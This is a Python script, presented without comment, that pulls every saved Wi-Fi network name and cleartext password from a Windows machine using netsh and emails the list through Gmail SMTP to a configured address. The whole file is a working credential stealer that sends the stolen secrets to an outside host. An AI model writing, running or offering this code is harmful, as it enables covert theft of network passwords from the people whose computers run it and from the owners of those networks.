import subprocess
import re
import smtplib
from email.message import EmailMessage
import ssl

class WiFiPasswordExtractor:
    def __init__(self, sender_email, sender_password, receiver_email):
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email

    def get_wifi_profiles(self):
        try:
            command_output = subprocess.run(
                ["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, encoding="utf-8"
            ).stdout
            profile_names = re.findall(r"All User Profile\s*:\s*(.*)", command_output)
            wifi_profiles = []

            for name in profile_names:
                profile_info = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name], capture_output=True, text=True, encoding="utf-8"
                ).stdout

                if "Security key           : Absent" in profile_info:
                    continue

                profile_info_pass = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True, text=True, encoding="utf-8"
                ).stdout

                password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info_pass)
                password = password_match.group(1).strip() if password_match else None
                wifi_profiles.append({"ssid": name.strip(), "password": password})

            return wifi_profiles
        except Exception as e:
            print(f"Error retrieving Wi-Fi profiles: {e}")
            return []

    def send_email(self, wifi_profiles):
        if not wifi_profiles:
            print("No Wi-Fi profiles to send.")
            return

        try:
            subject = "Wi-Fi Profiles and Passwords"
            body = "\n\n".join([f"SSID: {profile['ssid']}, Password: {profile['password']}" for profile in wifi_profiles])

            em = EmailMessage()
            em["From"] = self.sender_email
            em["To"] = self.receiver_email
            em["Subject"] = subject
            em.set_content(body)

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
                smtp.login(self.sender_email, self.sender_password)
                smtp.send_message(em)
            print("Email sent successfully!")
        except Exception as e:
            print(f"Error sending email: {e}")

    def run(self):
        wifi_profiles = self.get_wifi_profiles()
        if wifi_profiles:
            self.send_email(wifi_profiles)
        else:
            print("No Wi-Fi profiles found.")


if __name__ == "__main__":
    sender_email = "example@gmail.com"
    sender_password = "2fa password"
    receiver_email = "example@gmail.com"

    extractor = WiFiPasswordExtractor(sender_email, sender_password, receiver_email)
    extractor.run()